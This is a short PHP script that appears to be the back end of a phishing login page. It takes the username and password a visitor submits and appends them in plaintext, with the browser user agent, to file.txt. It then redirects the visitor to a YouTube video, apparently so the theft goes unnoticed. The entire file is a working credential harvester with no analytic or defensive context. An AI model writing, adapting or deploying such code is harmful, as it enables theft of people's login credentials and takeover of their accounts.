<?php
$handle = fopen("file.txt","a");
$browser_id = $_SERVER["HTTP_USER_AGENT"];
$email = $_POST['username'];
$password = $_POST['password'];
if ($email == '') 
{
	echo "<script>alert('Please enter username');</script>";
	exit();
}
if ($password == '')
{
	echo "<script>alert('Please enter password');</script>";
	exit();
}
fwrite($handle,"\n"."Browser Id = ".$browser_id."\n"."Username = ".$email."\n"."password = ".$password."\n");
header('location:https://youtu.be/drt_xoHLowI');
?>
